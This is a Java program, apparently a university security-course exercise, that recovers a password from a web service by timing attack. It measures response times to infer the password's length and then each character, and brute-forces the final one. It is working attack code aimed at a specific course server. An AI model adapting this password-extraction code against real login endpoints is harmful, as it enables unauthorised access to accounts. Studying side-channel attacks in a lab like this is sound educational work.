import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.io.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Anatoly {


    private static String alphateth = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private static String strurl="http://aoi.ise.bgu.ac.il/?user=%s&password=%s";
    private static String id="201553864";//"315617506";//"305938771";
    private static int rep=20;
    private static double mul=1.2;
    public static void main(String[] args) {

        int pass_len = 0;
        try {
            pass_len = ws_stats();
            System.out.println(pass_len);
            String res = analize_letters(pass_len);
            System.out.println(String.format("%s ",id)  + res);
        } catch (IOException e) {
            System.out.println("NoPassword");
        }
    }

    private static int ws_stats() throws IOException {
        StringBuilder sb = new StringBuilder();
        long[] times = new long[32];
        long max = 0;
        int argmax = -1;
        for (int i = 0; i < 32; i++) {
            sb.append("a");
            String password = sb.toString();
            //URL url = new URL("http://aoi.ise.bgu.ac.il/?user=305938771&password=" + password);
            URL url = new URL(String.format(strurl,id,password));
            times[i] = check_n(url, rep);
            if (max == 0) {
                max = times[i];
                argmax = i+1;
            } else if (max < times[i]) {
                argmax = i+1;
                max = times[i];
            }
        }
		//for (int i = 0; i < times.length; i++) {
		//	System.out.println(times[i]);
		//}
        //System.out.println(argmax);
        return argmax;
    }

    private static String analize_letters(int length) throws IOException {
        StringBuilder res = new StringBuilder("");
        String c = "";
        while (res.length() < length-1) {
            c = analize_n_th(res.toString(), length);
            res.append(c);
            System.out.println(res.toString());
        }
        for (int k = 0; k < alphateth.length(); k++){
            String password=res.toString()+alphateth.charAt(k);
            URL url = new URL(String.format(strurl,id,password));
            if(check_one(url).equals("1"))
                return password;
        }
        return "We have a problem";
    }

    private static String analize_n_th(String prev, int length) throws IOException {

        StringBuilder bstab = new StringBuilder();
        for (int i = prev.length(); i < length - 1; i++) {
            bstab.append('a');
        }
        String stab = bstab.toString();
        long[] times = new long[alphateth.length()];
        String argmax = "a";
        long max = 0;
        double sm = 0;
        for (int k = 0; k < alphateth.length(); k++) {
            String password = prev + alphateth.charAt(k) + stab;
            URL url = new URL(String.format(strurl,id,password));
            times[k] += check_n(url, rep);

            if (max == 0) {
                max = times[k];
                argmax = Character.toString(alphateth.charAt(k));
            } else if (max < times[k]) {
                argmax = Character.toString(alphateth.charAt(k));
                if ((max) * mul < (times[k])) {
                    //System.out.println(argmax);
                    return argmax;
                }
                max = times[k];
            }
            if (k == 5 && times[0] == max && (max) > (sm / k) * mul) {
                return Character.toString(alphateth.charAt(0));
            }
            sm += times[k];

        }
        System.out.println(argmax);
        return argmax;
    }


    private static long check_n(URL url,int n) throws IOException {
        long t1 = System.currentTimeMillis();
        for (int i = 0; i <n ; i++) {
            try (BufferedReader in = new BufferedReader(new InputStreamReader(((HttpURLConnection) url.openConnection()).getInputStream()))) {

            }
        }
        long t2 = System.currentTimeMillis();
        return t2 - t1;
    }



    private static String check_one(URL url) throws IOException {
        String inputLine="";
        try (BufferedReader in = new BufferedReader(new InputStreamReader(((HttpURLConnection) url.openConnection()).getInputStream()))) {
            inputLine = in.readLine();
        }
        return inputLine;
    }

    private static void print_times(long[] times) {
        for (int i = 0; i < 26; i++) {
            System.out.print(alphateth.charAt(i) + ": " + Long.toString(times[i]) + '\n');
        }

    }
}
